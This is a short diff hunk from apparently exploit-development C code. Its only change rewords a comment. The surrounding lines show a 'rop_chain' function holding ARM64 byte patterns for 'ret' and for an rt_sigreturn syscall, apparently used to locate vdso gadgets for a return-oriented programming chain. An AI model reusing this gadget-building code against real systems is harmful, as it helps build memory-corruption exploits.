@@ -130,7 +130,7 @@ static inline void *rop_chain(struct cleanup *params) {
         0xc0, 0x03, 0x5f, 0xd6, /* ret */
     };
 
-    // vdso patterns for call rt_sigreturn
+    // vdso patterns to call rt_sigreturn
     static const uint8_t mov_x8_rt_sigreturn_svc[] = {
         0x68, 0x11, 0x80, 0xd2, /* mov x8, #139 */
         0x01, 0x00, 0x00, 0xd4, /* svc #0 */
